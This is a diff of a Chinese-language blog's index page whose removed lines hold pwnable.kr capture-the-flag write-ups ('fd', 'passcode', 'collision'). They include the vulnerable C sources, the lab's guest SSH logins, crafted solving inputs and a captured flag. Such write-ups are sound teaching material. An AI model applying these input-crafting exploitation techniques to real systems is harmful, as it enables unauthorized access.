@@ -1,642 +1,148 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>Kabalts&#39;s Blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Kabalts&#39;s Blog">
-<meta property="og:url" content="https://kabalts.github.io/index.html">
-<meta property="og:site_name" content="Kabalts&#39;s Blog">
-<meta property="og:locale">
-<meta property="article:author" content="kabalts">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Kabalts's Blog" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+<html lang="zh">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-  
+    <meta name="author" content="kabalts">
+
+
+
+    <meta name="description" content=" ">
+
+
+
+
+
+<title>Kabalts&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    
 
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
 
-<meta name="generator" content="Hexo 7.3.0"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Kabalts&#39;s Blog</a>
-      </h1>
-      
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+<script src='https://unpkg.com/valine@1.4.16/dist/Valine.min.js'></script>
+
+
+
+  <meta name="generator" content="Hexo 7.3.0"></head>
+  <body>
+    <div class="mask-border">
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Suche"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://kabalts.github.io"></form>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Frame.
+          
+        </a>
       </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-fd" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/10/16/fd/" class="article-date">
-  <time class="dt-published" datetime="2026-10-16T06:18:27.366Z" itemprop="datePublished">2026-10-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/10/16/fd/">fd</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="从零开始的pwnable-kr（1）"><a href="#从零开始的pwnable-kr（1）" class="headerlink" title="从零开始的pwnable.kr（1）"></a>从零开始的pwnable.kr（1）</h1><hr>
-<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><hr>
-<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><p>一些常用<strong>终端指令</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span>  //  显示当前目录下的文件和子目录列表</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> filename    //将名为filename的文件内容输出</span><br><span class="line"></span><br><span class="line">./filename  //执行名为filename的程序</span><br></pre></td></tr></table></figure>
-
-<p><strong>文件描述符  file descriptor</strong><br>在Linux&#x2F;Unix中,一切皆文件,内核用数字编号代表打开的文件<br>其中<strong>默认固定</strong>的有三个</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = 0  //stdin标准输入</span><br><span class="line">fd = 1  //stdout标准输出</span><br><span class="line">fd = 2  //stderr标准报错</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>根据提示连接到终端</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh fd@pwnable.kr -p2222</span><br></pre></td></tr></table></figure>
-
-<p>密码为 <code>guest</code><br>连接成功后输入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
-
-<p>观察到文件目录为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd fd.c flag</span><br></pre></td></tr></table></figure>
-
-<p>尝试 <code>cat flag</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>: flag: Permission denied</span><br></pre></td></tr></table></figure>
-
-<p>尝试从 <code>fd</code>入手<br>查看 <code>fd</code>的源码 <code>fd.c</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> fd.c</span><br></pre></td></tr></table></figure>
-
-<p>源码为</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">	<span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">	len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">		setregid(getegid(), getegid());</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>分析其源码逻辑:<br>执行 <code>fd</code>后会显示 <code>pass argv[1] a number</code>,程序会读取字符串存到 <code>argv[1]</code>,</p>
-<p>这个字符串会被转化为整数并与 <code>0x1234</code>做差后作为<em><strong>文件描述</strong></em><em><strong>符</strong></em> <code>fd</code>,<code>0x1234 = 4660</code>,</p>
-<p>因此在 <code>./fd</code>后加上 <code>4660</code>即可,执行后,程序会等待从标准输入输入内容,</p>
-<p>此时输入的字符串会与 <code>LETMEWIN</code>进行比较,相同则会临时提权并输出我们要的 <code>flag</code></p>
-<p>分析完毕,执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br><span class="line">LETMEWIN</span><br></pre></td></tr></table></figure>
-
-<p>输出了我们想要的结果,第二行就是我们要的 <code>flag</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">good job :)</span><br><span class="line">Mama! Now_I_understand_what_file_descriptors_are!</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>我们在上面输入的是 <code>./fd 4660</code>来把 <code>fd</code>置为0并进行 <code>stdin</code>,<br>但是如果进行尝试可以发现输入 <code>./fd 4661</code>和 <code>./fd 4662</code>也可以进行输入,<br>详细原因笔者暂时未知,之后有机会会写一篇文章分析一下</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://kabalts.github.io/2026/10/16/fd/" data-id="cmval20830001pov7bejxbwoy" data-title="fd" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84pwnable-kr/" rel="tag">从零开始的pwnable.kr</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-passcode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/10/16/passcode/" class="article-date">
-  <time class="dt-published" datetime="2026-10-16T06:18:27.366Z" itemprop="datePublished">2026-10-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/10/16/passcode/">passcode</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="从零开始的pwnable-kr（4）"><a href="#从零开始的pwnable-kr（4）" class="headerlink" title="从零开始的pwnable.kr（4）"></a>从零开始的pwnable.kr（4）</h1><hr>
-<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><hr>
-<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><hr>
-<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>根据提示连接到终端</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh passcode@pwnable.kr -p2222</span><br></pre></td></tr></table></figure>
-
-<p>密码为 <code>guest</code><br>连接成功后输入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l</span><br></pre></td></tr></table></figure>
-
-<p>观察到文件目录为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">total 32</span><br><span class="line">drwxrwxr-x 2 root passcode      4096 May 12 17:52 a</span><br><span class="line">-r--r----- 1 root passcode_pwn    42 Apr 19  2025 flag</span><br><span class="line">-r-xr-sr-x 1 root passcode_pwn 16424 May  8 08:55 passcode</span><br><span class="line">-rw-r--r-- 1 root root           894 Apr 29 19:30 passcode.c</span><br></pre></td></tr></table></figure>
-
-<p>这次多了个 <code>a</code>目录，而写 <code>a</code>目录是允许创建 <code>exp.py</code>的</p>
-<p>先查看 <code>passcode.c</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">login</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> passcode1;</span><br><span class="line">        <span class="type">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;passcode1);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;passcode1);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(passcode1==<span class="number">123456</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                setregid(getegid(), getegid());</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.1 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        welcome();</span><br><span class="line">        login();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// something after login...</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>有个 <code>fflush(stdin)</code>不太明白，结果 ai 也不明白（悲!）</p>
-<p>在网上看了其他师傅的题解，<code>fflush(stdin)</code>刷新标准输入缓冲区，把输入缓冲区里的东西丢弃</p>
-<p>但是这题的源码似乎改过了，网上看到的题解里并非现在的 <code>scanf(&quot;%d&quot;, &amp;passcode1)</code>和 <code>scanf(&quot;%d&quot;, &amp;passcode1)</code></p>
-<p>而是 <code>scanf(&quot;%d&quot;, passcode1)</code>和 <code>scanf(&quot;%d&quot;, passcode1)</code>，所以现在其实只要按源码让 <code>passcode1==123456</code>且 <code>passcode2==13371337</code>就能输出 <code>flag</code>了</p>
-<p>不理解改的意义是什么，感兴趣的能去看看以前的题解</p>
-<p><del>绝对不是我想水一期</del></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://kabalts.github.io/2026/10/16/passcode/" data-id="cmval20860005pov7gctw3pft" data-title="passcode" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84pwnable-kr/" rel="tag">从零开始的pwnable.kr</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-collision" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/10/16/collision/" class="article-date">
-  <time class="dt-published" datetime="2026-10-16T06:18:27.363Z" itemprop="datePublished">2026-10-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/10/16/collision/">collision</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="从零开始的pwnable-kr（2）"><a href="#从零开始的pwnable-kr（2）" class="headerlink" title="从零开始的pwnable.kr（2）"></a>从零开始的pwnable.kr（2）</h1><hr>
-<h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><hr>
-<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><p><strong>大端序&#x2F;小端序</strong></p>
-<p><strong>小端序</strong>（<strong>Little Endian</strong>）：低位字节存放在低地址，高位字节存放在高地址</p>
-<p><strong>大端序</strong>（<strong>Big Endian</strong>）：高位字节存放在低地址，低位字节存放在高地址。</p>
-<p>现代的绝大多数现代桌面和服务器环境都是采用<strong>小端序</strong></p>
-<p>在 Linux 系统中一般可以用如下指令判断：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import sys; print(sys.byteorder)&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>输出为<code>little</code>或<code>big</code></p>
-<p>本题的环境是<strong>小端序</strong></p>
-<p><strong>echo</strong></p>
-<p><code>echo</code>是在 Linux 和 Unix 系统中一个非常基础且常用的命令，它的主要功能是将指定的字符串输出到标准输出（通常是终端屏幕）。</p>
-<p>基本格式为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -[选项] -[字符串]</span><br></pre></td></tr></table></figure>
-
-<p>对于 Bash 中的<code>echo -e &#39;\xHH&#39;</code> 而言，<code>-e</code>用于启用反斜杠转义字符的解释，这里启用后会输出十六进制数 <code>HH</code>对应的 ASCII 字符。</p>
-<p><code>echo $SHELL</code>可以查看当前使用的 SHELL ，常见的 SHELL 有 Bash 、 zsh 等。</p>
-<p>其中 Bash 中的<code>echo</code>默认不解析转义字符，需显式指定<code>-e</code>，而在 zsh 默认解析转义字符</p>
-<p>本题采用的 SHELL 为 Bash</p>
-<hr>
-<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>根据提示连接到终端</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh col@pwnable.kr -p2222</span><br></pre></td></tr></table></figure>
-
-<p>密码为 <code>guest</code><br>连接成功后输入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
-
-<p>观察到文件目录为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">col col.c flag</span><br></pre></td></tr></table></figure>
-
-<p>从 <code>col</code>入手<br>查看 <code>col</code>的源码 <code>col.c</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> col.c</span><br></pre></td></tr></table></figure>
-
-<p>源码为</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                setregid(getegid(), getegid());</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>分析其源码逻辑:</p>
-<p>这是一个简单的密码验证程序，要求输入一个长度为 20 字节的字符串，将其直接按<strong>内存中的字节顺序</strong> 4 字节一组拆分为 5 个整数，求和后与预设的 <code>hashcode = 0x21DD09EC</code> 比较，若相等则输出 <code>flag</code>。</p>
-<p>我们需要构造 5 个 32 位整数，每个整数的 4 个字节均不能为 <code>0x00</code>（否则会被 <code>strlen</code> 截断），且它们的和等于 <code>0x21DD09EC</code>。</p>
-<p>一个比较简单的构造方式是先选取四个相同的整数（整数的 4 个字节均不能为 <code>0x00</code>），比如<code>0x01010101</code>，那么很显然第5个数 &#x3D; <code>0x21DD09EC</code> - <code>0x04040404</code> &#x3D; <code>0x1DD905E8</code>，<code>0x1DD905E8</code>也符合整数的 4 个字节均不为 <code>0x00</code>的条件。</p>
-<p>在<strong>小端序</strong>系统中，整数在内存中的字节顺序是低字节在前。因此 5 个整数的字节序列为：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x01010101 → \x01\x01\x01\x01</span><br><span class="line"></span><br><span class="line">0x01010101 → \x01\x01\x01\x01</span><br><span class="line"></span><br><span class="line">0x01010101 → \x01\x01\x01\x01</span><br><span class="line"></span><br><span class="line">0x01010101 → \x01\x01\x01\x01</span><br><span class="line"></span><br><span class="line">0x1DD905E8 → \xE8\x05\xD9\x1D</span><br></pre></td></tr></table></figure>
-
-<p>最终 20 字节字符串为（十六进制表示）：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 E8 05 D9 1D</span><br></pre></td></tr></table></figure>
-
-<p>分析完毕，执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col $(<span class="built_in">echo</span> -e <span class="string">&#x27;\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xE8\x05\xD9\x1D&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>当然这题的字符串构造解还有很多，甚至可以利用 ascii 码表巧妙地构建出键盘可直接输入的字符串，比如也可以执行如下指令获取<code>flag</code>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col <span class="string">&quot;mmmmmmmmmmmmmmmm8T&#x27;l&quot;</span></span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://kabalts.github.io/2026/10/16/collision/" data-id="cmval20850003pov7190972i2" data-title="collision" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84pwnable-kr/" rel="tag">从零开始的pwnable.kr</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-bof" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/10/16/bof/" class="article-date">
-  <time class="dt-published" datetime="2026-10-16T06:18:27.358Z" itemprop="datePublished">2026-10-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/10/16/bof/">bof</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="从零开始的pwnable-kr（3）"><a href="#从零开始的pwnable-kr（3）" class="headerlink" title="从零开始的pwnable.kr（3）"></a>从零开始的pwnable.kr（3）</h1><hr>
-<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><hr>
